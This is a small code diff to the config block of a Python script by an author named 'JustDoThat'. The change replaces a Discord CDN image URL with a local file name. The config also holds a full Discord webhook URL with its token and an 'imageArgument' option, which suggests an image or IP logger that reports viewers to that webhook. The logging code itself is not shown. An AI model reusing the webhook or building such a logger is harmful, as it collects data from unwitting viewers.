@@ -10,7 +10,7 @@ __author__ = "JustDoThat"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1297868061415702621/Gt9D_NkHVr7PcyCWNx8NO3845B8pr3RzzH0BvV8LMlQtNzk5IyTTq8YPj1gJjRG07lHR",
-    "image": "https://cdn.discordapp.com/attachments/1297868237123358761/1297868255951589386/2024-10-21_19.24.51.png?ex=67177d81&is=67162c01&hm=7704fed29554669e341749236151b5cb1215816757e8d9ea24e60d3d30ddd4f9&", # You can also have a custom image by using a URL argument
+    "image": "2024-10-21_19.24.51.png", # You can also have a custom image by using a URL argument
     "imageArgument": True,
 
     # CUSTOMIZATION #
